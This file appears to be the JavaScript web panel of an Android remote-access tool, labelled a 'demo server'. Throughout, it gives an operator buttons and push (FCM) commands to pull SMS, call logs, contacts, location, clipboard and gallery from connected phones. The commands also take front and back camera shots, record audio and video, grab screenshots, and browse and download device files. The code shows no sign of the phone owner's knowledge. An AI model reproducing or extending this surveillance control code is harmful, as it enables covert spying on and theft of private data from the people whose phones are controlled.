<!-- Android Device Demo Server - Web GUI v6.0 -->

let pollingInterval = null;
let currentReceivedDir = '';
let selectedGalleryItem = null;
let selectedFileItem = null;
let currentDeviceSessionId = null;
const POLL_INTERVAL = 3000;

document.addEventListener('DOMContentLoaded', () => {
    setupTabs();
    setupDashboardControls();
    setupFCMControls();
    setupGalleryControls();
    setupFileBrowserControls();
    setupReceivedFilesControls();
    setupDataViewerControls();
    setupScreenshotControls();
    startPolling();
});

// === TAB SWITCHING ===
function setupTabs() {
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            btn.classList.add('active');
            document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
        });
    });
}

// === POLLING ===
function startPolling() {
    if (pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(fetchDashboardData, POLL_INTERVAL);
    fetchDashboardData();
}

function fetchDashboardData() {
    Promise.all([
        fetch('/api/devices').then(r => r.json()).catch(() => []),
        fetch('/api/logs').then(r => r.json()).catch(() => ({ logs: [] })),
        fetch('/api/stats').then(r => r.json()).catch(() => ({}))
    ])
    .then(([devices, logsData, stats]) => {
        updateDevices(devices);
        updateLogs(logsData);
        updateStats(stats);
        checkFCMStatus();
    })
    .catch(() => {});
}

// === DASHBOARD ===
function updateDevices(devices) {
    const el = document.getElementById('devices-list');
    if (!devices || devices.length === 0) { el.innerHTML = '<p>No devices connected</p>'; return; }

    let html = '';
    devices.forEach(d => {
        const isSelected = currentDeviceSessionId === d.id;
        html += `<div class="device-card ${d.status === 'ONLINE' ? 'online' : 'offline'} ${isSelected ? 'selected' : ''}" data-id="${d.id}" data-status="${d.status}">
            <div class="dev-header">
                <strong>${d.model || d.id}</strong>
                <span class="dev-status" style="color:${d.status === 'ONLINE' ? '#3fb950' : '#f85149'}">${d.status}</span>
            </div>
            <div class="dev-info">
                IP: ${d.ip}<br>
                Model: ${d.model}<br>
                Img: ${d.images} | Vid: ${d.videos} | Notif: ${d.notifications}
            </div>
        </div>`;
    });
    el.innerHTML = html;

    // Add click handlers to online devices only
    el.querySelectorAll('.device-card.online').forEach(card => {
        card.addEventListener('click', () => {
            const newId = card.dataset.id;
            if (currentDeviceSessionId !== newId) {
                currentDeviceSessionId = newId;
                // Clear per-device UI state
                selectedGalleryItem = null;
                selectedFileItem = null;
                selectedScreenshot = null;
                fileBrowserHistory = [];
                // Reset gallery/file/data views
                document.getElementById('gallery-grid').innerHTML = '<p>Select a device and click "Gallery List" on dashboard first.</p>';
                document.getElementById('filebrowser-list').innerHTML = '<p>Select a device and browse a path.</p>';
                document.getElementById('data-viewer').innerHTML = '<p>Select a data type above to view data.</p>';
                document.getElementById('screenshot-grid').innerHTML = '<p>No screenshots for this device. Take a screenshot from the dashboard first.</p>';
                // Re-render to update selection highlighting
                updateDevices(devices);
            }
        });
    });

    // Auto-select first online device if none selected or selected device is offline
    const onlineDevices = devices.filter(d => d.status === 'ONLINE');
    if (onlineDevices.length > 0) {
        if (!currentDeviceSessionId || !devices.find(d => d.id === currentDeviceSessionId && d.status === 'ONLINE')) {
            currentDeviceSessionId = onlineDevices[0].id;
            // Re-render to show auto-selection
            updateDevices(devices);
        }
    }
}

function updateLogs(data) {
    const el = document.getElementById('logs');
    if (!el) return;
    const logs = data.logs || [];
    if (!logs.length) { el.innerHTML = '<p>Waiting for logs...</p>'; return; }
    el.innerHTML = logs.map(line => `<div class="log-entry">${line}</div>`).join('');
    const container = document.getElementById('logs-container');
    if (container) container.scrollTop = container.scrollHeight;
}

function updateStats(stats) {
    const el = document.getElementById('stats');
    if (!el || !stats) return;
    const uptime = stats.uptime ? Math.round(stats.uptime) + 's' : '0s';
    el.innerHTML = `
        <div class="stat-item"><div class="stat-label">Uptime</div><div class="stat-value">${uptime}</div></div>
        <div class="stat-item"><div class="stat-label">Connections</div><div class="stat-value">${stats.total_connections || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Active</div><div class="stat-value">${stats.active_connections || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Images</div><div class="stat-value">${stats.total_images || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Audio</div><div class="stat-value">${stats.total_audio || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Videos</div><div class="stat-value">${stats.total_videos || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Commands</div><div class="stat-value">${stats.total_commands || 0}</div></div>
        <div class="stat-item"><div class="stat-label">Notifications</div><div class="stat-value">${stats.total_notifications || 0}</div></div>`;
}

function sendCommand(command, args) {
    if (!currentDeviceSessionId) {
        console.warn('No device selected — command not sent:', command);
        return Promise.resolve({ status: 'error', error: 'No device selected. Please select a device from the dashboard.' });
    }
    const body = { command, args: args || '{}' };
    body.session_id = currentDeviceSessionId;
    return fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    }).then(r => r.json()).catch(err => {
        console.error('sendCommand error:', err);
        return { status: 'error', error: err };
    });
}

function setupDashboardControls() {
    const btns = [
        ['btn-device-info', 'get_device_info'], ['btn-location', 'get_location'],
        ['btn-storage', 'get_storage_info'], ['btn-app-list', 'get_app_list'],
        ['btn-gallery', 'get_gallery_list'], ['btn-sms', 'get_sms_logs'],
        ['btn-call-logs', 'get_call_logs'], ['btn-contacts', 'get_contacts'],
        ['btn-notifications', 'get_notifications'], ['btn-camera-front', 'capture_front'],
        ['btn-camera-back', 'capture_back'], ['btn-record-audio', 'record_audio'],
        ['btn-record-video', 'record_video'], ['btn-screenshot', 'screenshot'],
        ['btn-battery', 'get_battery_info'], ['btn-clipboard', 'get_clipboard'],
        ['btn-download-gallery', 'download_gallery']
    ];
    btns.forEach(([id, cmd]) => {
        const el = document.getElementById(id);
        if (el) el.addEventListener('click', () => {
            sendCommand(cmd).then(() => setTimeout(fetchDashboardData, 1500));
        });
    });

    const sendBtn = document.getElementById('btn-send-custom');
    if (sendBtn) sendBtn.addEventListener('click', () => {
        const cmd = document.getElementById('cmd-input').value.trim();
        const args = document.getElementById('args-input').value.trim() || '{}';
        if (!cmd) return;
        sendCommand(cmd, args).then(() => {
            document.getElementById('cmd-input').value = '';
            document.getElementById('args-input').value = '';
            setTimeout(fetchDashboardData, 1500);
        });
    });

    const cmdInput = document.getElementById('cmd-input');
    if (cmdInput) cmdInput.addEventListener('keypress', e => { if (e.key === 'Enter') document.getElementById('btn-send-custom').click(); });
}

// === FCM PUSH COMMANDS ===
function setupFCMControls() {
    // Check FCM status on load
    checkFCMStatus();

    // Wire up all FCM command buttons
    const fcmBtns = [
        ['fcm-device-info', 'get_device_info'], ['fcm-location', 'get_location'],
        ['fcm-storage', 'get_storage_info'], ['fcm-app-list', 'get_app_list'],
        ['fcm-gallery', 'get_gallery_list'], ['fcm-sms', 'get_sms_logs'],
        ['fcm-call-logs', 'get_call_logs'], ['fcm-contacts', 'get_contacts'],
        ['fcm-notifications', 'get_notifications'], ['fcm-camera-front', 'capture_front'],
        ['fcm-camera-back', 'capture_back'], ['fcm-record-audio', 'record_audio'],
        ['fcm-record-video', 'record_video'], ['fcm-screenshot', 'screenshot'],
        ['fcm-battery', 'get_battery_info'], ['fcm-clipboard', 'get_clipboard'],
        ['fcm-download-gallery', 'download_gallery']
    ];
    fcmBtns.forEach(([id, cmd]) => {
        const el = document.getElementById(id);
        if (el) el.addEventListener('click', () => sendFCMCommand(cmd));
    });

    // Custom FCM command
    const sendCustomBtn = document.getElementById('btn-fcm-send-custom');
    if (sendCustomBtn) sendCustomBtn.addEventListener('click', () => {
        const cmd = document.getElementById('fcm-cmd-input').value.trim();
        const args = document.getElementById('fcm-args-input').value.trim() || '{}';
        if (!cmd) return;
        sendFCMCommand(cmd, args);
    });

    const fcmCmdInput = document.getElementById('fcm-cmd-input');
    if (fcmCmdInput) fcmCmdInput.addEventListener('keypress', e => { if (e.key === 'Enter') document.getElementById('btn-fcm-send-custom').click(); });
}

function checkFCMStatus() {
    fetch('/api/fcm-tokens').then(r => r.json()).then(data => {
        const badge = document.getElementById('fcm-status-badge');
        if (!badge) return;
        const tokens = data.tokens || {};
        const tokenCount = Object.keys(tokens).length;
        if (data.fcm_configured === false) {
            badge.textContent = 'FCM Not Configured';
            badge.className = 'fcm-badge fcm-badge-error';
            badge.title = 'Place firebase-service-account.json on the server';
        } else if (tokenCount === 0) {
            badge.textContent = 'No Tokens';
            badge.className = 'fcm-badge fcm-badge-warning';
            badge.title = 'No devices have registered FCM tokens yet';
        } else {
            badge.textContent = `FCM Active (${tokenCount} device${tokenCount > 1 ? 's' : ''})`;
            badge.className = 'fcm-badge fcm-badge-ok';
            badge.title = `${tokenCount} device(s) have FCM tokens registered`;
        }
    }).catch(() => {
        const badge = document.getElementById('fcm-status-badge');
        if (badge) {
            badge.textContent = 'FCM Status Unknown';
            badge.className = 'fcm-badge fcm-badge-unknown';
        }
    });
}

function sendFCMCommand(command, args) {
    const resultEl = document.getElementById('fcm-result');
    if (resultEl) resultEl.innerHTML = '<span class="fcm-sending">\u2709\uFE0F Sending FCM push: ' + command + '...</span>';

    if (!currentDeviceSessionId) {
        if (resultEl) resultEl.innerHTML = '<span class="fcm-error">\u274C No device selected. Please select a device from the dashboard.</span>';
        return Promise.resolve({ status: 'error' });
    }

    const params = new URLSearchParams({
        command: command,
        session: currentDeviceSessionId,
        args: args || '{}'
    });

    return fetch('/api/fcm-send?' + params.toString())
        .then(r => r.json())
        .then(data => {
            if (resultEl) {
                if (data.status === 'success') {
                    resultEl.innerHTML = '<span class="fcm-success">\u2705 FCM command "' + command + '" sent successfully! Device should execute it shortly. Message ID: ' + (data.message_id || 'N/A') + '</span>';
                } else {
                    resultEl.innerHTML = '<span class="fcm-error">\u274C FCM failed: ' + (data.message || data.error || 'Unknown error') + '</span>';
                }
            }
            // Refresh dashboard after a delay
            setTimeout(fetchDashboardData, 2000);
            return data;
        })
        .catch(err => {
            if (resultEl) resultEl.innerHTML = '<span class="fcm-error">\u274C FCM request error: ' + err + '</span>';
            return { status: 'error', error: err };
        });
}

// === GALLERY TAB ====
function setupGalleryControls() {
    document.getElementById('btn-refresh-gallery')?.addEventListener('click', loadGallery);
    document.getElementById('btn-download-gallery-item')?.addEventListener('click', () => {
        if (!selectedGalleryItem) { alert('Select a gallery item first'); return; }
        sendCommand('download_gallery_item', JSON.stringify({ item_id: selectedGalleryItem.id }))
            .then(() => { document.getElementById('gallery-status').textContent = 'Download request sent'; });
    });
    document.getElementById('btn-download-all-gallery')?.addEventListener('click', () => {
        sendCommand('download_gallery').then(() => {
            document.getElementById('gallery-status').textContent = 'Download all request sent';
        });
    });
}

function loadGallery() {
    // Use currently selected device or find first online device
    if (!currentDeviceSessionId) {
        document.getElementById('gallery-grid').innerHTML = '<p>No device selected. Please select a device from the dashboard.</p>';
        return;
    }
    const sessionId = currentDeviceSessionId;

    fetch('/api/gallery?session=' + sessionId).then(r => r.json()).then(data => {
        const grid = document.getElementById('gallery-grid');
        const items = data.gallery || [];
        if (!items.length) { grid.innerHTML = '<p>No gallery data. Click "Gallery List" on dashboard first.</p>'; return; }
        grid.innerHTML = items.map(item => {
            const isImg = item.type && item.type.startsWith && item.type.startsWith('image/');
            const icon = isImg ? '\u{1F5BC}' : (item.type && item.type.startsWith('video/') ? '\u{1F3AC}' : '\u{1F4C4}');
            // Show source folder of each image
            const parts = (item.name || '').split('/');
            const fileName = parts[parts.length - 1] || item.name || 'Unknown';
            const folderName = parts.length > 1 ? parts.slice(0, -1).join('/') : '';
            const displayName = folderName ? fileName + ' (' + folderName + ')' : fileName;
            return `<div class="gallery-item" data-id="${item.id}" data-name="${item.name || ''}" data-type="${item.type || ''}" data-folder="${folderName}">
                    <div class="gi-icon">${icon}</div>
                    <div class="gi-name">${displayName}</div>
                    <div class="gi-size">${formatSize(item.size || 0)}</div>
                </div>`;
        }).join('');

        grid.querySelectorAll('.gallery-item').forEach(el => {
            el.addEventListener('click', () => {
                grid.querySelectorAll('.gallery-item').forEach(x => x.classList.remove('selected'));
                el.classList.add('selected');
                selectedGalleryItem = { id: el.dataset.id, name: el.dataset.name, type: el.dataset.type, folder: el.dataset.folder };
            });
        });
    }).catch(() => {
        document.getElementById('gallery-grid').innerHTML = '<p>Error loading gallery data.</p>';
    });
}

// === FILE BROWSER TAB ===
let fileBrowserHistory = []; // Track navigation history for back button

function setupFileBrowserControls() {
    document.getElementById('btn-browse-path')?.addEventListener('click', () => {
        const path = document.getElementById('filepath-input').value.trim() || '/storage/emulated/0/';
        fileBrowserHistory = []; // Reset history on manual browse
        browseFiles(path);
    });
    document.getElementById('btn-filebrowser-back')?.addEventListener('click', () => {
        if (fileBrowserHistory.length > 0) {
            const prevPath = fileBrowserHistory.pop();
            document.getElementById('filepath-input').value = prevPath;
            browseFiles(prevPath, true); // skipHistory=true so we don't re-push
        }
    });
    document.getElementById('btn-download-file')?.addEventListener('click', () => {
        if (!selectedFileItem) { alert('Select a file first'); return; }
        sendCommand('download_file', JSON.stringify({ path: selectedFileItem.path }))
            .then(() => { document.getElementById('filebrowser-status').textContent = 'Download request sent'; });
    });
}

function browseFiles(path, skipHistory) {
    // Use currently selected device or find first online device
    if (!currentDeviceSessionId) {
        document.getElementById('filebrowser-status').textContent = 'No device selected. Please select a device from the dashboard.';
        return;
    }
    const sessionId = currentDeviceSessionId;

    // Save current path to history before navigating (unless going back)
    if (!skipHistory) {
        const currentPath = document.getElementById('filepath-input').value.trim();
        if (currentPath && currentPath !== path) {
            fileBrowserHistory.push(currentPath);
        }
    }
    document.getElementById('filepath-input').value = path;

    sendCommand('list_files', JSON.stringify({ path })).then(() => {
        document.getElementById('filebrowser-status').textContent = 'Request sent to device. Waiting for response...';
        // Poll for response with retries (device may take time)
        let attempts = 0;
        const maxAttempts = 5;
        const pollFiles = () => {
            fetch('/api/filebrowser?session=' + sessionId).then(r => r.json()).then(data => {
                const files = data.files || [];
                if (!files.length && attempts < maxAttempts) {
                    attempts++;
                    setTimeout(pollFiles, 1000 * attempts);
                    return;
                }
                renderFileBrowser(files, path);
            });
        };
        // Small delay to let command reach device
        setTimeout(pollFiles, 1500);
    });
}

function renderFileBrowser(files, currentPath) {
    const container = document.getElementById('filebrowser-list');
    if (!files.length) {
        container.innerHTML = '<p>No files returned. Make sure the device is connected and has granted storage permission.</p>';
        document.getElementById('filebrowser-status').textContent = 'No files found';
        return;
    }

    // Build breadcrumb from path
    const parts = currentPath.split('/').filter(Boolean);
    let breadcrumb = '<div class="fb-breadcrumb"><button class="fb-crumb" data-path="/">/</button> ';
    let accumulated = '';
    parts.forEach((part, i) => {
        accumulated += '/' + part;
        breadcrumb += `<button class="fb-crumb" data-path="${accumulated}">${part}</button>`;
        if (i < parts.length - 1) breadcrumb += ' / ';
    });
    breadcrumb += '</div>';

    // Sort: directories first, then alphabetically
    files.sort((a, b) => {
        const aDir = a.is_directory || a.is_dir || false;
        const bDir = b.is_directory || b.is_dir || false;
        if (aDir !== bDir) return aDir ? -1 : 1;
        return (a.name || '').toLowerCase().localeCompare((b.name || '').toLowerCase());
    });

    container.innerHTML = breadcrumb + files.map(f => {
        const isDir = f.is_directory || f.is_dir || false;
        const dirIcon = isDir ? '\u{1F4C1}' : '\u{1F4C4}';
        const fullPath = f.path || f.full_path || '';
        return `<div class="fb-item${isDir ? ' fb-folder' : ''}" data-path="${fullPath}" data-name="${f.name || ''}" data-isdir="${isDir}">
            <span class="fb-icon">${dirIcon}</span>
            <span class="fb-name">${f.name || 'Unknown'}</span>
            <span class="fb-size">${isDir ? '' : formatSize(f.size || 0)}</span>
            <span class="fb-type">${isDir ? 'DIR' : 'FILE'}</span>
        </div>`;
    }).join('');

    // Single click on folder = navigate into it; single click on file = select
    container.querySelectorAll('.fb-item').forEach(el => {
        el.addEventListener('click', () => {
            const isDir = el.dataset.isdir === 'true';
            if (isDir) {
                // Navigate into folder on single click
                browseFiles(el.dataset.path);
            } else {
                container.querySelectorAll('.fb-item').forEach(x => x.classList.remove('selected'));
                el.classList.add('selected');
                selectedFileItem = { path: el.dataset.path };
                document.getElementById('filebrowser-status').textContent = 'Selected: ' + (el.dataset.name || el.dataset.path);
            }
        });
    });

    // Breadcrumb navigation
    container.querySelectorAll('.fb-crumb').forEach(el => {
        el.addEventListener('click', () => browseFiles(el.dataset.path));
    });

    // Update back button state
    const backBtn = document.getElementById('btn-filebrowser-back');
    if (backBtn) backBtn.disabled = fileBrowserHistory.length === 0;

    document.getElementById('filebrowser-status').textContent = 'Showing ' + files.length + ' items in ' + currentPath;
}

// === RECEIVED FILES TAB ===
function setupReceivedFilesControls() {
    document.getElementById('btn-refresh-received')?.addEventListener('click', () => loadReceivedFiles(currentReceivedDir));
    document.getElementById('btn-received-up')?.addEventListener('click', () => {
        if (!currentReceivedDir) return;
        const parts = currentReceivedDir.split('/');
        parts.pop();
        loadReceivedFiles(parts.join('/'));
    });
    loadReceivedFiles('');
}

function loadReceivedFiles(subdir) {
    currentReceivedDir = subdir;
    fetch('/api/received-files?dir=' + encodeURIComponent(subdir) + '&session=' + currentDeviceSessionId).then(r => r.json()).then(data => {
        const container = document.getElementById('received-list');
        document.getElementById('received-path').textContent = '/' + (subdir || '');
        const files = data.files || [];
        if (!files.length) { container.innerHTML = '<p>No files in this directory.</p>'; return; }
        container.innerHTML = files.map(f => {
            const icon = f.is_dir ? '\u{1F4C1}' : getFileIcon(f.name);
            const link = f.is_dir ? '' : `<a class="ri-link" href="/api/download-file?path=${encodeURIComponent(f.path)}&session=${currentDeviceSessionId}" target="_blank">View/Download</a>`;
            return `<div class="received-item" data-path="${f.path}" data-isdir="${f.is_dir}">
                <span class="ri-icon">${icon}</span>
                <span class="ri-name">${f.name}</span>
                <span class="ri-size">${formatSize(f.size)}</span>
                ${link}
            </div>`;
        }).join('');

        container.querySelectorAll('.received-item').forEach(el => {
            el.addEventListener('click', () => {
                if (el.dataset.isdir === 'true') loadReceivedFiles(el.dataset.path);
            });
        });
    });
}

function getFileIcon(name) {
    const ext = name.split('.').pop().toLowerCase();
    if (['jpg','jpeg','png','gif','webp','bmp'].includes(ext)) return '\u{1F5BC}';
    if (['mp4','3gp','avi','mkv'].includes(ext)) return '\u{1F3AC}';
    if (['mp3','wav','ogg','3gp'].includes(ext)) return '\u{1F3B5}';
    if (['json','txt','log'].includes(ext)) return '\u{1F4C4}';
    return '\u{1F4C4}';
}

function formatSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

// === DATA VIEWER TAB ===
function setupDataViewerControls() {
    const btns = [
        ['btn-view-sms', 'sms_logs', renderSMS],
        ['btn-view-call', 'call_logs', renderCallLogs],
        ['btn-view-contacts', 'contacts', renderContacts],
        ['btn-view-apps', 'app_list', renderAppList],
        ['btn-view-location', 'location', renderLocation],
        ['btn-view-storage', 'storage', renderStorage],
        ['btn-view-device', 'device_info', renderDeviceInfo],
        ['btn-view-battery', 'battery_info', renderBattery],
        ['btn-view-clipboard', 'clipboard', renderClipboard]
    ];
    btns.forEach(([id, type, renderer]) => {
        document.getElementById(id)?.addEventListener('click', () => {
            if (!currentDeviceSessionId) {
                document.getElementById('data-viewer').innerHTML = '<p class="data-empty">No device selected. Please select a device from the dashboard.</p>';
                return;
            }
            const sessionId = currentDeviceSessionId;

            // Map data types to server commands
            const cmdMap = {
                sms_logs: 'get_sms_logs',
                call_logs: 'get_call_logs',
                contacts: 'get_contacts',
                app_list: 'get_app_list',
                location: 'get_location',
                storage: 'get_storage_info',
                device_info: 'get_device_info',
                battery_info: 'get_battery_info',
                clipboard: 'get_clipboard'
            };

            // Send command to device first
            if (cmdMap[type]) {
                sendCommand(cmdMap[type]);
            }

            // Poll for data with retries (device may take time to respond)
            let attempts = 0;
            const maxAttempts = 5;
            const viewer = document.getElementById('data-viewer');
            viewer.innerHTML = '<p class="data-loading">Loading... (waiting for device response)</p>';

            const checkData = () => {
                fetch('/api/data?session=' + sessionId + '&type=' + type)
                    .then(r => r.json())
                    .then(data => {
                        const result = data[type] || [];
                        const isEmpty = !result || (Array.isArray(result) && !result.length) || (typeof result === 'object' && !Array.isArray(result) && !Object.keys(result).length);
                        if (isEmpty && attempts < maxAttempts) {
                            attempts++;
                            setTimeout(checkData, 1000 * attempts);
                        } else if (isEmpty) {
                            viewer.innerHTML = '<p class="data-empty">No ' + type.replace(/_/g, ' ') + ' data yet. Make sure the device is connected and has granted permissions.</p>';
                        } else {
                            viewer.innerHTML = renderer(result);
                        }
                    })
                    .catch(() => {
                        if (attempts < maxAttempts) {
                            attempts++;
                            setTimeout(checkData, 1000 * attempts);
                        } else {
                            viewer.innerHTML = '<p class="data-empty">Error fetching ' + type.replace(/_/g, ' ') + ' data.</p>';
                        }
                    });
            };
            // Small initial delay to let command reach device
            setTimeout(checkData, 1500);
        });
    });
}

function renderSMS(items) {
    if (!items.length) return '<p class="data-empty">No SMS data</p>';
    const typeMap = {1:'INBOX',2:'SENT',3:'DRAFT',4:'OUTBOX'};
    return `<table><thead><tr><th>Type</th><th>From</th><th>Body</th><th>Date</th></tr></thead><tbody>` +
        items.map(s => `<tr><td>${typeMap[s.type]||'?'}</td><td>${s.from||'?'}</td><td>${(s.body||'').substring(0,80)}</td><td>${s.date||''}</td></tr>`).join('') +
        `</tbody></table>`;
}

function renderCallLogs(calls) {
    if (!calls.length) return '<p class="data-empty">No call logs</p>';
    const typeMap = {1:'IN',2:'OUT',3:'MISSED',4:'VM',5:'REJ',6:'BLK'};
    return `<table><thead><tr><th>Type</th><th>Name</th><th>Number</th><th>Duration</th><th>Date</th></tr></thead><tbody>` +
        calls.map(c => `<tr><td>${typeMap[c.type]||'?'}</td><td>${c.name||'-'}</td><td>${c.number||'?'}</td><td>${c.duration_sec||0}s</td><td>${c.date||''}</td></tr>`).join('') +
        `</tbody></table>`;
}

function renderContacts(contacts) {
    if (!contacts.length) return '<p class="data-empty">No contacts</p>';
    return `<table><thead><tr><th>Name</th><th>Phone Numbers</th></tr></thead><tbody>` +
        contacts.map(c => `<tr><td>${c.name||'Unknown'}</td><td>${(c.phones||[]).map(p => typeof p === 'string' ? p : p.number||'').join(', ')}</td></tr>`).join('') +
        `</tbody></table>`;
}

function renderAppList(apps) {
    if (!apps.length) return '<p class="data-empty">No app list</p>';
    return `<table><thead><tr><th>#</th><th>App</th></tr></thead><tbody>` +
        apps.map((a,i) => `<tr><td>${i+1}</td><td>${a}</td></tr>`).join('') +
        `</tbody></table>`;
}

function renderLocation(loc) {
    if (!loc || !Object.keys(loc).length) return '<p class="data-empty">No location data</p>';
    return `<table><tbody>` +
        `<tr><th>Latitude</th><td>${loc.latitude||'?'}</td></tr>` +
        `<tr><th>Longitude</th><td>${loc.longitude||'?'}</td></tr>` +
        `<tr><th>Accuracy</th><td>${loc.accuracy||'?'}m</td></tr>` +
        `<tr><th>Provider</th><td>${loc.provider||'?'}</td></tr>` +
        `<tr><th>Altitude</th><td>${loc.altitude||'?'}</td></tr>` +
        `<tr><th>Speed</th><td>${loc.speed||'?'}</td></tr>` +
        `</tbody></table>`;
}

function renderStorage(s) {
    if (!s || !Object.keys(s).length) return '<p class="data-empty">No storage data</p>';
    return `<table><tbody>` +
        `<tr><th>Total</th><td>${s.total_gb||'?'} GB</td></tr>` +
        `<tr><th>Free</th><td>${s.free_gb||'?'} GB</td></tr>` +
        `<tr><th>Used</th><td>${s.used_percent||'?'}%</td></tr>` +
        `</tbody></table>`;
}

function renderDeviceInfo(info) {
    if (!info || !Object.keys(info).length) return '<p class="data-empty">No device info</p>';
    const d = info.device_info || info;
    return `<table><tbody>` +
        Object.entries(d).map(([k,v]) => `<tr><th>${k}</th><td>${v}</td></tr>`).join('') +
        `</tbody></table>`;
}

function renderBattery(b) {
    if (!b || !Object.keys(b).length) return '<p class="data-empty">No battery data</p>';
    return `<table><tbody>` +
        `<tr><th>Level</th><td>${b.percent ?? '?'}%</td></tr>` +
        `<tr><th>Status</th><td>${b.status || '?'}</td></tr>` +
        `<tr><th>Plugged</th><td>${b.plugged || '?'}</td></tr>` +
        `<tr><th>Temperature</th><td>${b.temperature ?? '?'}°C</td></tr>` +
        `<tr><th>Voltage</th><td>${b.voltage ?? '?'}V</td></tr>` +
        `<tr><th>Health</th><td>${b.health || '?'}</td></tr>` +
        `</tbody></table>`;
}

function renderClipboard(c) {
    if (!c || !Object.keys(c).length) return '<p class="data-empty">No clipboard data</p>';
    const text = c.text || '(empty)';
    const note = c.note ? `<tr><th>Note</th><td>${c.note}</td></tr>` : '';
    return `<table><tbody>` +
        `<tr><th>Content</th><td>${text}</td></tr>` +
        note +
        `</tbody></table>`;
}

// === SCREENSHOT GALLERY TAB ===
function setupScreenshotControls() {
    document.getElementById('btn-refresh-screenshots')?.addEventListener('click', loadScreenshots);
    document.getElementById('btn-download-selected-screenshot')?.addEventListener('click', downloadSelectedScreenshot);
    document.getElementById('btn-delete-selected-screenshot')?.addEventListener('click', deleteSelectedScreenshot);
}

let selectedScreenshot = null;

function loadScreenshots() {
    fetch('/api/screenshots?session=' + currentDeviceSessionId)
        .then(r => r.json())
        .then(data => {
            const grid = document.getElementById('screenshot-grid');
            const screenshots = data.screenshots || [];
            if (!screenshots.length) {
                grid.innerHTML = '<p>No screenshots available. Take a screenshot from the dashboard first.</p>';
                return;
            }
            grid.innerHTML = screenshots.map(screenshot => {
                return `<div class="screenshot-item" data-path="${screenshot.path}">
                    <img src="/api/download-file?path=${encodeURIComponent(screenshot.path)}&session=${currentDeviceSessionId}" alt="${screenshot.name}">
                    <div class="screenshot-info">
                        <div class="filename">${screenshot.name}</div>
                        <div class="size">${formatSize(screenshot.size)}</div>
                    </div>
                    <button class="delete-btn" title="Delete">×</button>
                </div>`;
            }).join('');

            // Add click handlers for screenshot selection
            grid.querySelectorAll('.screenshot-item').forEach(item => {
                item.addEventListener('click', (e) => {
                    // Don't select if clicking the delete button
                    if (e.target.classList.contains('delete-btn')) return;
                    
                    grid.querySelectorAll('.screenshot-item').forEach(i => i.classList.remove('selected'));
                    item.classList.add('selected');
                    selectedScreenshot = { 
                        path: item.dataset.path,
                        name: item.querySelector('.filename').textContent,
                        size: parseInt(item.querySelector('.size').textContent.replace(/[^\d]/g, '')) // Extract number from size string
                    };
                });
            });

            // Add click handlers for delete buttons
            grid.querySelectorAll('.delete-btn').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    e.stopPropagation(); // Prevent triggering item selection
                    const item = e.target.closest('.screenshot-item');
                    const path = item.dataset.path;
                    if (confirm(`Delete screenshot ${item.querySelector('.filename').textContent}?`)) {
                        fetch('/api/delete-file?path=' + encodeURIComponent(path) + '&session=' + currentDeviceSessionId, { method: 'DELETE' })
                            .then(r => r.json())
                            .then(result => {
                                if (result.status === 'success') {
                                    loadScreenshots(); // Refresh the gallery
                                    document.getElementById('screenshot-status').textContent = 'Screenshot deleted';
                                } else {
                                    alert('Failed to delete screenshot: ' + (result.error || 'Unknown error'));
                                }
                            })
                            .catch(() => {
                                alert('Failed to delete screenshot');
                            });
                    }
                });
            });

            // Add double-click to view full size
            grid.querySelectorAll('.screenshot-item').forEach(item => {
                item.addEventListener('dblclick', (e) => {
                    if (e.target.classList.contains('delete-btn')) return;
                    const img = item.querySelector('img');
                    showImageModal(img.src, item.querySelector('.filename').textContent);
                });
            });
        })
        .catch(() => {
            document.getElementById('screenshot-grid').innerHTML = '<p>Error loading screenshots.</p>';
        });
}

function downloadSelectedScreenshot() {
    if (!selectedScreenshot) {
        alert('Select a screenshot first');
        return;
    }
    // Trigger download by creating a temporary link
    const link = document.createElement('a');
    link.href = '/api/download-file?path=' + encodeURIComponent(selectedScreenshot.path) + '&session=' + currentDeviceSessionId;
    link.download = selectedScreenshot.name;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    document.getElementById('screenshot-status').textContent = 'Download started: ' + selectedScreenshot.name;
}

function deleteSelectedScreenshot() {
    if (!selectedScreenshot) {
        alert('Select a screenshot first');
        return;
    }
    if (confirm(`Delete screenshot ${selectedScreenshot.name}?`)) {
        fetch('/api/delete-file?path=' + encodeURIComponent(selectedScreenshot.path) + '&session=' + currentDeviceSessionId, { method: 'DELETE' })
            .then(r => r.json())
            .then(result => {
                if (result.status === 'success') {
                    loadScreenshots(); // Refresh the gallery
                    selectedScreenshot = null;
                    document.getElementById('screenshot-status').textContent = 'Screenshot deleted';
                } else {
                    alert('Failed to delete screenshot: ' + (result.error || 'Unknown error'));
                }
            })
            .catch(() => {
                alert('Failed to delete screenshot');
            });
    }
}

function showImageModal(imgSrc, title) {
    const modal = document.createElement('div');
    modal.className = 'image-modal show';
    modal.innerHTML = `
        <div>
            <img src="${imgSrc}" alt="${title}">
            <div class="image-info">${title}</div>
            <button class="close-btn">&times;</button>
        </div>
    `;
    document.body.appendChild(modal);
    
    const closeBtn = modal.querySelector('.close-btn');
    closeBtn.addEventListener('click', () => {
        modal.remove();
    });
    
    // Click outside image to close
    modal.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.remove();
        }
    });
}